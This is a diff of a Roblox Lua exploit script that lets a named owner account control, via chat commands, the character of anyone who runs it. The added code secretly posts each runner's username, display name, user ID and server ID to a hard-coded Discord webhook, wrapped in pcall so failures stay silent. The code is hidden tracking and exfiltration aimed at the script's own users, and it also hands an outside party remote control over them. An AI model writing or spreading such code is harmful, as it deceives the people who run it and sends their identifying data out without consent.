@@ -1,5 +1,4 @@
 if RedLoaded == true then
-	print("Loaded")
 	return
 end
 
@@ -9,17 +8,18 @@ end)
 
 ----- [ Locals ] -----
 
-_G.AdminUser = "HOLE_THAI2"
+_G.OwnerUser = "HOLE_THAI2"
 localplr = game:GetService("Players").LocalPlayer
 _G.Prefix = "."
-_G.Len = string.len(_G.Prefix)
 
 ----- [ Functions ] -----
 
 game:GetService("Players").PlayerAdded:Connect(function(player)
-	if player:IsFriendsWith(1242620826) or player.Name == _G.AdminUser then
-		GiveCom(player)
-	end
+	pcall(function()
+		if player:IsFriendsWith(1242620826) or player.Name == _G.OwnerUser then
+			GiveCom(player)
+		end
+	end)
 end)
 
 function AddCmd(Message, CmdName, Spawn)
@@ -50,179 +50,241 @@ end
 
 function GiveCom(Player)
 	Player.Chatted:Connect(function(msg)
-		SendCommand(string.lower(msg))
+		SendCommand(string.lower(msg), Player)
 	end)
 end
 
-for i, v in pairs(game.Players:GetPlayers()) do
-	if v:IsFriendsWith(1242620826) or v.Name == _G.AdminUser then
-		GiveCom(v)
+pcall(function()
+	for i, v in pairs(game:GetService("Players"):GetPlayers()) do
+		if v:IsFriendsWith(1242620826) or v.Name == _G.OwnerUser then
+			GiveCom(v)
+		end
 	end
-end
+end)
 
 ----- [ Commands ] -----
 
-function SendCommand(Com)
+function SendCommand(Com, PlayerSend)
 
-Args = string.split(Com, " ")
-
------ [ LocalPlayer Commands ] -----
-
-	AddCmd(Com, "jump", function()
-		localplr.Character:FindFirstChildOfClass("Humanoid").PlatformStand = false
-		localplr.Character:FindFirstChildOfClass("Humanoid").Sit = false
-		localplr.Character:FindFirstChildOfClass("Humanoid").Jump = true
-	end)
-	AddCmd(Com, "sit", function()
-		localplr.Character:FindFirstChildOfClass("Humanoid").Sit = true
-	end)
-	AddCmd(Com, "reset", function()
-		localplr.Character:FindFirstChildOfClass("Humanoid").Health = 0
-	end)
-	AddCmd(Com, "kick", function()
-		localplr:Kick("Fuck You!")
-	end)
-	AddCmd(Com, "rejoin", function()
-		game:GetService("TeleportService"):Teleport(game.PlaceId)
-	end)
-	AddCmd(Com, "stun", function()
-		localplr.Character:FindFirstChildOfClass('Humanoid').PlatformStand = true
-	end)
-	AddCmd(Com, "trip", function()
-		game:GetService("Players").LocalPlayer:FindFirstChildOfClass("Humanoid"):ChangeState(0)
-		if Args[2] == "" then
-			game:GetService("Players").LocalPlayer:FindFirstChild("HumanoidRootPart").Velocity = game:GetService("Players").LocalPlayer:FindFirstChild("HumanoidRootPart").CFrame.LookVector * 30
-		elseif Args[2] ~= "" then
-			game:GetService("Players").LocalPlayer:FindFirstChild("HumanoidRootPart").Velocity = game:GetService("Players").LocalPlayer:FindFirstChild("HumanoidRootPart").CFrame.LookVector * tonumber(Args[2])
-		end
-	end)
-	AddCmd(Com, "lay", function()
-		local Human = localplr.Character and localplr.Character:FindFirstChildOfClass('Humanoid')
-		if not Human then
-			return
-		end
-		Human.Sit = true
-		task.wait(.1)
-		Human.RootPart.CFrame = Human.RootPart.CFrame * CFrame.Angles(math.pi * .5, 0, 0)
-		for _, v in ipairs(Human:GetPlayingAnimationTracks()) do
-			v:Stop()
-		end
-	end)
-	AddCmd(Com, "nuh", function()
-		for i,v in pairs(localplr.Character:GetDescendants()) do
-			if v:IsA("Clothing") or v:IsA("ShirtGraphic") then
-				v:Destroy()
-			end
-		end
-	end)
-	AddCmd(Com, "chat", function()
-		game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(Args[2], "All")
-	end)
-
------ [ Stop Command ] -----
-
-	AddCmd(Com, "unstun", function()
-		localplr.Character:FindFirstChildOfClass('Humanoid').PlatformStand = false
-	end)
-	AddCmd(Com, "stop", function()
-		for i = 1, 10 do
-			_G.Clap = false
+	Args = string.split(Com, " ")
+	SenderCommandPlr = PlayerSend
+	
+	----- [ LocalPlayer Commands ] -----
+	
+		AddCmd(Com, "jump", function()
+			localplr.Character:FindFirstChildOfClass("Humanoid").PlatformStand = false
 			localplr.Character:FindFirstChildOfClass("Humanoid").Sit = false
-			pcall(function()
-				game.Players.LocalPlayer.Character.HumanoidRootPart:FindFirstChildOfClass("BodyVelocity"):Destroy()
-				game.Players.LocalPlayer.Character.HumanoidRootPart:FindFirstChildOfClass("BodyGyro"):Destroy()
-			end)
-		end
-	end)
-	AddCmd(Com, "unfollow", function()
-		_G.Follow = false
-	end)
-
------ [ On others ] -----
-
-	AddCmd(Com, "follow", function()
-		for i,v in pairs(GetPlayer(Args[2])) do
-			spawn(function()
-				_G.Follow = true
-				while _G.Follow == true do wait()
-					localplr.Character:FindFirstChildOfClass("Humanoid"):MoveTo(v.Character:FindFirstChild("HumanoidRootPart").Position)
+			localplr.Character:FindFirstChildOfClass("Humanoid").Jump = true
+		end)
+		AddCmd(Com, "sit", function()
+			localplr.Character:FindFirstChildOfClass("Humanoid").Sit = true
+		end)
+		AddCmd(Com, "reset", function()
+			localplr.Character:FindFirstChildOfClass("Humanoid").Health = 0
+		end)
+		AddCmd(Com, "kick", function()
+			localplr:Kick("Fuck You!")
+		end)
+		AddCmd(Com, "rejoin", function()
+			game:GetService("TeleportService"):Teleport(game.PlaceId)
+		end)
+		AddCmd(Com, "stun", function()
+			localplr.Character:FindFirstChildOfClass('Humanoid').PlatformStand = true
+		end)
+		AddCmd(Com, "trip", function()
+			game:GetService("Players").LocalPlayer:FindFirstChildOfClass("Humanoid"):ChangeState(0)
+			if Args[2] == "" then
+				game:GetService("Players").LocalPlayer:FindFirstChild("HumanoidRootPart").Velocity = game:GetService("Players").LocalPlayer:FindFirstChild("HumanoidRootPart").CFrame.LookVector * 30
+			elseif Args[2] ~= "" then
+				game:GetService("Players").LocalPlayer:FindFirstChild("HumanoidRootPart").Velocity = game:GetService("Players").LocalPlayer:FindFirstChild("HumanoidRootPart").CFrame.LookVector * tonumber(Args[2])
+			end
+		end)
+		AddCmd(Com, "lay", function()
+			local Human = localplr.Character and localplr.Character:FindFirstChildOfClass('Humanoid')
+			if not Human then
+				return
+			end
+			Human.Sit = true
+			task.wait(.1)
+			Human.RootPart.CFrame = Human.RootPart.CFrame * CFrame.Angles(math.pi * .5, 0, 0)
+			for _, v in ipairs(Human:GetPlayingAnimationTracks()) do
+				v:Stop()
+			end
+		end)
+		AddCmd(Com, "nuh", function()
+			for i,v in pairs(localplr.Character:GetDescendants()) do
+				if v:IsA("Clothing") or v:IsA("ShirtGraphic") then
+					v:Destroy()
 				end
+			end
+		end)
+		AddCmd(Com, "chat", function()
+			pcall(function()
+				game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(Args[2], "All")
 			end)
+		end)
+	
+	----- [ Stop Command ] -----
+	
+		AddCmd(Com, "unstun", function()
+			localplr.Character:FindFirstChildOfClass('Humanoid').PlatformStand = false
+		end)
+		AddCmd(Com, "stop", function()
+			for i = 1, 10 do
+				_G.Clap = false
+				localplr.Character:FindFirstChildOfClass("Humanoid").Sit = false
+				pcall(function()
+					game:GetService("Players").LocalPlayer.Character:FindFirstChild("HumanoidRootPart"):FindFirstChildOfClass("BodyVelocity"):Destroy()
+					game:GetService("Players").LocalPlayer.Character:FindFirstChild("HumanoidRootPart"):FindFirstChildOfClass("BodyGyro"):Destroy()
+				end)
+			end
+		end)
+		AddCmd(Com, "unfollow", function()
+			_G.Follow = false
+		end)
+	
+	----- [ On others ] -----
+	
+	if string.find(Com, _G.Prefix) and Args[2] == "me" then
+		AddCmd(Com, "follow", function()
+			for i,v in pairs(GetPlayer(Args[2]), PlayerSend) do
+				spawn(function()
+					_G.Follow = true
+					while _G.Follow == true do wait()
+						localplr.Character:FindFirstChildOfClass("Humanoid"):MoveTo(v.Character:FindFirstChild("HumanoidRootPart").Position)
+					end
+				end)
+			end
+		end)
+		AddCmd(Com, "givecom", function()
+			for i,v in pairs(GetPlayer(Args[2]), PlayerSend) do
+				GiveCom(v)
+			end
+		end)
+		AddCmd(Com, "clap", function()
+			for i,v in pairs(GetPlayer(Args[2]), PlayerSend) do
+				GetClapped(v)
+			end
+		end)
+		AddCmd(Com, "friend", function()
+			for i,v in pairs(GetPlayer(Args[2]), PlayerSend) do
+				game:GetService("Players").LocalPlayer:RequestFriendship(v)
+			end
+		end)
+		AddCmd(Com, "unfriend", function()
+			for i,v in pairs(GetPlayer(Args[2]), PlayerSend) do
+				game:GetService("Players").LocalPlayer:RevokeFriendship(v)
+			end
+		end)
+	else
+		AddCmd(Com, "follow", function()
+			for i,v in pairs(GetPlayer(Args[2]), nil) do
+				spawn(function()
+					_G.Follow = true
+					while _G.Follow == true do wait()
+						localplr.Character:FindFirstChildOfClass("Humanoid"):MoveTo(v.Character:FindFirstChild("HumanoidRootPart").Position)
+					end
+				end)
+			end
+		end)
+		AddCmd(Com, "givecom", function()
+			for i,v in pairs(GetPlayer(Args[2]), nil) do
+				GiveCom(v)
+			end
+		end)
+		AddCmd(Com, "clap", function()
+			for i,v in pairs(GetPlayer(Args[2]), nil) do
+				GetClapped(v)
+			end
+		end)
+		AddCmd(Com, "friend", function()
+			for i,v in pairs(GetPlayer(Args[2]), nil) do
+				game:GetService("Players").LocalPlayer:RequestFriendship(v)
+			end
+		end)
+		AddCmd(Com, "unfriend", function()
+			for i,v in pairs(GetPlayer(Args[2]), nil) do
+				game:GetService("Players").LocalPlayer:RevokeFriendship(v)
+			end
+		end)
+	
+	----- [ Others ] -----
+	
+		if Args[1] == "!prefix" then
+			_G.Prefix = Args[2]
 		end
-	end)
-	AddCmd(Com, "givecom", function()
-		for i,v in pairs(GetPlayer(Args[2])) do
-			GiveCom(v)
-		end
-	end)
-	AddCmd(Com, "clap", function()
-		for i,v in pairs(GetPlayer(Args[2])) do
-			GetClapped(v)
-		end
-	end)
-	AddCmd(Com, "friend", function()
-		for i,v in pairs(GetPlayer(Args[2])) do
-			game:GetService("Players").LocalPlayer:RequestFriendship(v)
-		end
-	end)
-	AddCmd(Com, "unfriend", function()
-		for i,v in pairs(GetPlayer(Args[2])) do
-			game:GetService("Players").LocalPlayer:RevokeFriendship(v)
-		end
-	end)
-
------ [ Others ] -----
-
-	if Args[1] == "!prefix" then
-		_G.Prefix = Args[2]
-		_G.Len = string.len(_G.Prefix)
 	end
 end
 
-function GetPlayer(String)
+function GetPlayer(String, SendPlr)
 	local Found = {}
 	local strl = String:lower()
-	if strln== "" then
-		return table.insert(Found, nil)
-	elseif strl == "all" then
-		for i,v in pairs(game.Players:GetPlayers()) do
-			table.insert(Found,v)
-		end
-	elseif strl == "others" then
-		for i,v in pairs(game.Players:GetPlayers()) do
-			if v.Name ~= game.Players.LocalPlayer.Name then
+	if SendPlr ~= nil and strl == "me" then
+		table.insert(Found, SendPlr)
+		return Found
+	else
+		if strl == "" then
+			local Found = {}
+		elseif strl == "all" then
+			for i,v in pairs(game:GetService("Players"):GetPlayers()) do
 				table.insert(Found,v)
 			end
-		end
-	elseif strl == "me" then
-		table.insert(Found, game:GetService("Players")[_G.AdminUser])
-	elseif strl == "random" then
-		local players = game.Players:GetPlayers()
-		local localplayer = game.Players.LocalPlayer
-		table.remove(players, table.find(players, localplayer))
-		return {players[math.random(1,#players)]}
-	elseif strl == "nearest" then
-		local player = game.Players.LocalPlayer
-		local character = player.Character or player.CharacterAdded:Wait()
-		local ohVector32 = character.HumanoidRootPart.Position
-		local closestPlayer, closestDistance
-		for _, p in pairs(game.Players:GetPlayers()) do
-			if p ~= player and p.Character then
-				local distance = (ohVector32 - p.Character.HumanoidRootPart.Position).Magnitude
-				if not closestDistance or distance < closestDistance then
-					closestDistance = distance
-					closestPlayer = Found,p
-					table.insert(Found,p)
+		elseif strl == "others" then
+			for i,v in pairs(game:GetService("Players"):GetPlayers()) do
+				if v.Name ~= game:GetService("Players").LocalPlayer.Name then
+					table.insert(Found,v)
+				end
+			end
+		elseif strl == "random" then
+			local players = game:GetService("Players"):GetPlayers()
+			local localplayer = game:GetService("Players").LocalPlayer
+			table.remove(players, table.find(players, localplayer))
+			return {players[math.random(1,#players)]}
+		elseif strl == "nearest" then
+			local player = game:GetService("Players").LocalPlayer
+			local character = player.Character or player.CharacterAdded:Wait()
+			local ohVector32 = character:FindFirstChild("HumanoidRootPart").Position
+			local closestPlayer, closestDistance
+			for _, p in pairs(game:GetService("Players"):GetPlayers()) do
+				if p ~= player and p.Character then
+					local distance = (ohVector32 - p.Character:FindFirstChild("HumanoidRootPart").Position).Magnitude
+					if not closestDistance or distance < closestDistance then
+						closestDistance = distance
+						closestPlayer = Found,p
+						table.insert(Found,p)
+					end
+				end
+			end
+			return Found
+		else
+			for i,v in pairs(game:GetService("Players"):GetPlayers()) do
+				if v.Name:lower():sub(1, #String) == String:lower() or v.DisplayName:lower():sub(1, #String) == String:lower() then
+					table.insert(Found,v)
 				end
 			end
 		end
 		return Found
-	else
-		for i,v in pairs(game.Players:GetPlayers()) do
-			if v.Name:lower():sub(1, #String) == String:lower() or v.DisplayName:lower():sub(1, #String) == String:lower() then
-				table.insert(Found,v)
-			end
-		end
 	end
-	return Found    
 end
+
+pcall(function()
+	if game:GetService("Players").LocalPlayer.Name ~= _G.OwnerUser then
+		pcall(function()
+			httprequest = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
+			local data = {
+			    content = "```" .."This Person Executed Your Script." .. "\n" .. "UserName: " .. game:GetService("Players").LocalPlayer.Name .. "\n" .. "Display Name: ".. game:GetService("Players").LocalPlayer.DisplayName .. "\n" .. "UserId: " .. game:GetService("Players").LocalPlayer.UserId .. "\n" .. "Server Id: " .. game.JobId .. "\n" .. "Server Size: " .. #game:GetService("Players"):GetChildren() .. "/" .. game:GetService("Players").MaxPlayers .. "\n" .. "```"
+			}
+			
+			local headers = {
+			    ["Content-Type"] = "application/json"
+			}
+			
+		    httprequest({
+		        Url = "https://discord.com/api/webhooks/1124536479130067044/9f1kCIrh007AgIZIWCNL_Z4ylyo1MjBx02f40OxiYJUlFcPp1unXLSLKZ267cunUL8Pm",
+		        Method = "POST",
+		        Headers = headers,
+		        Body = game:GetService("HttpService"):JSONEncode(data)
+		    })
+		end)
+	end
+end)
